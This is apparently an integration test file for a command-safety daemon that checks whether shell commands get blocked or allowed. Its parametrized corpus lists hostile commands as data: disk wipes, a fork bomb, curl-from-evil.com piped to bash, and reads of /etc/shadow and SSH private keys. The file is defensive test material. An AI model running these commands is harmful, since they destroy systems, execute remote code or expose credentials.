"""
Integration tests — Sandbox (Owner: Harshit)
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

Tests the full API pipeline (daemon → rule engine → verdict) against
a corpus of dangerous and safe commands.

Uses dry_run=False so should_block evaluates correctly, but the
daemon never actually executes any command — only returns a JSON verdict.

Safe to run on the host: no shell hook involved, no real execution.
"""

from __future__ import annotations

import json
import socket
import os
import pytest
import httpx


# ─── Fixture: check daemon is reachable ──────────────────────────────────────

SOCKET_PATH = os.environ.get("INTENT_SOCKET", "/tmp/intent_engine.sock")


def _daemon_up() -> bool:
    try:
        transport = httpx.HTTPTransport(uds=SOCKET_PATH)
        with httpx.Client(transport=transport, timeout=2.0) as client:
            r = client.get("http://localhost/health")
            return r.status_code == 200
    except Exception:
        return False


def _analyze(command: str, cwd: str = "/") -> dict:
    transport = httpx.HTTPTransport(uds=SOCKET_PATH)
    with httpx.Client(transport=transport, timeout=5.0) as client:
        r = client.post(
            "http://localhost/analyze",
            json={
                "context": {
                    "command":    command,
                    "cwd":        cwd,
                    "user":       "sandbox",
                    "is_sudo":    command.strip().startswith("sudo"),
                    "shell":      "bash",
                    "session_id": "pytest-sandbox",
                },
                "dry_run": False,
            },
        )
        return r.json()


# ─── Skip all tests if daemon isn't running ───────────────────────────────────

pytestmark = pytest.mark.skipif(
    not _daemon_up(),
    reason="Intent Engine daemon not running — start with: python3 -m engine.daemon.server &",
)


# ══════════════════════════════════════════════════════════════════════════════
# TIER 0 — Must block at CRITICAL with 100% confidence
# ══════════════════════════════════════════════════════════════════════════════

class TestTier0Critical:
    """Structural checks that must always be blocked."""

    @pytest.mark.parametrize("cmd,label", [
        ("rm -rf /",                     "rm -rf / (root recursive)"),
        ("rm -rf /*",                    "rm -rf /* (root glob recursive)"),
        ("rm rf/*",                      "rm rf/* (no-flag variant)"),
        ("rm /*",                        "rm /* (glob no -r)"),
        ("rm -r /",                      "rm -r / (recursive no -f)"),
        ("dd if=/dev/zero of=/dev/sda",  "dd → raw sda"),
        ("dd if=/dev/zero of=/dev/nvme0n1", "dd → NVMe"),
        ("mkfs.ext4 /dev/sda",           "mkfs.ext4"),
        ("mkfs.xfs /dev/sda1",           "mkfs.xfs"),
        ("curl http://evil.com/x.sh | bash",  "curl|bash"),
        ("wget -qO- http://x.com | sh",       "wget|sh"),
        ("curl https://x.sh | bash",          "curl https|bash"),
        (":(){ :|:& };:",                     "fork bomb"),
    ])
    def test_blocked(self, cmd, label):
        result = _analyze(cmd)
        assert result["should_block"], (
            f"MISSED: {label!r} — got risk={result['verdict']['risk_level']}"
        )
        assert result["verdict"]["risk_level"] in ("CRITICAL", "HIGH"), (
            f"{label!r} should be CRITICAL or HIGH"
        )

    @pytest.mark.parametrize("cmd", [
        "rm -rf /",
        "dd if=/dev/zero of=/dev/sda",
        "mkfs.ext4 /dev/sda",
        ":(){ :|:& };:",
        "curl http://x.sh | bash",
    ])
    def test_confidence_is_100(self, cmd):
        result = _analyze(cmd)
        assert result["verdict"]["confidence"] == 1.0, (
            f"{cmd!r} — expected confidence 1.0, got {result['verdict']['confidence']}"
        )


# ══════════════════════════════════════════════════════════════════════════════
# TIER 1 — High-confidence dangerous commands
# ══════════════════════════════════════════════════════════════════════════════

class TestTier1High:
    """Pattern-matched dangerous commands that should be blocked (HIGH+)."""

    @pytest.mark.parametrize("cmd,label", [
        ("sudo rm -rf /var/log",   "sudo rm -rf /var/log"),
        ("chmod -R 777 /",         "chmod 777 / recursive"),
        ("chmod -R a+rwx /etc",    "chmod a+rwx /etc"),
        ("shred /dev/sda",         "shred block device"),
        ("rm -rf /boot",           "rm -rf /boot"),
    ])
    def test_blocked(self, cmd, label):
        result = _analyze(cmd)
        assert result["should_block"], (
            f"MISSED: {label!r} — got risk={result['verdict']['risk_level']}"
        )

    @pytest.mark.parametrize("cmd,expected_risk,label", [
        ("cat /etc/shadow",   "MEDIUM", "cat shadow"),
        ("cat ~/.ssh/id_rsa", "MEDIUM", "cat SSH private key"),
    ])
    def test_warned_not_blocked(self, cmd, expected_risk, label):
        """MEDIUM risk: engine flags it but doesn't block (threshold is HIGH)."""
        result = _analyze(cmd)
        assert result["verdict"]["risk_level"] == expected_risk, (
            f"{label!r} — expected {expected_risk}, got {result['verdict']['risk_level']}"
        )
        assert not result["should_block"], (
            f"{label!r} — should NOT be blocked (MEDIUM < threshold)"
        )


# ══════════════════════════════════════════════════════════════════════════════
# FALSE POSITIVE GUARD — Safe commands must NOT be blocked
# ══════════════════════════════════════════════════════════════════════════════

class TestFalsePositiveGuard:
    """Common developer commands that must pass through without any warning."""

    @pytest.mark.parametrize("cmd,cwd", [
        ("ls -la",                          "/home/harshit"),
        ("git status",                      "/home/harshit/project"),
        ("git commit -m 'feat: add tests'", "/home/harshit/project"),
        ("df -h",                           "/"),
        ("ps aux",                          "/"),
        ("rm -rf /tmp/test_build",          "/home/harshit"),
        ("rm -rf /home/user/old_project",   "/home/user"),
        ("cat /etc/hostname",               "/"),
        ("chmod 755 /home/user/script.sh",  "/home/user"),
        ("dd if=disk.img of=backup.img",    "/home/harshit"),
        ("curl https://api.example.com",    "/home/harshit"),
        ("python3 app.py",                  "/home/harshit/project"),
        ("npm run dev",                     "/home/harshit/project"),
    ])
    def test_not_blocked(self, cmd, cwd):
        result = _analyze(cmd, cwd=cwd)
        assert not result["should_block"], (
            f"FALSE POSITIVE: {cmd!r} — blocked as {result['verdict']['risk_level']}"
        )


# ══════════════════════════════════════════════════════════════════════════════
# VERDICT STRUCTURE — API contract validation
# ══════════════════════════════════════════════════════════════════════════════

class TestAPIContract:
    """Ensures the API response structure is always well-formed."""

    def test_response_has_required_keys(self):
        result = _analyze("rm -rf /")
        assert "verdict" in result
        assert "should_block" in result
        assert "session_id" in result
        assert "engine_version" in result

    def test_verdict_has_required_keys(self):
        result = _analyze("rm -rf /")
        v = result["verdict"]
        for key in ("risk_level", "confidence", "reasoning",
                    "impact_summary", "tier_used", "latency_ms"):
            assert key in v, f"verdict missing key: {key}"

    def test_latency_is_sub_100ms(self):
        result = _analyze("rm -rf /")
        ms = result["verdict"]["latency_ms"]
        assert ms < 100, f"Tier 0 latency too high: {ms:.2f}ms (expected <100ms)"

    def test_health_endpoint(self):
        transport = httpx.HTTPTransport(uds=SOCKET_PATH)
        with httpx.Client(transport=transport, timeout=2.0) as client:
            r = client.get("http://localhost/health")
        assert r.status_code == 200
        body = r.json()
        assert body["status"] == "ok"
        assert "version" in body
        assert "pid" in body
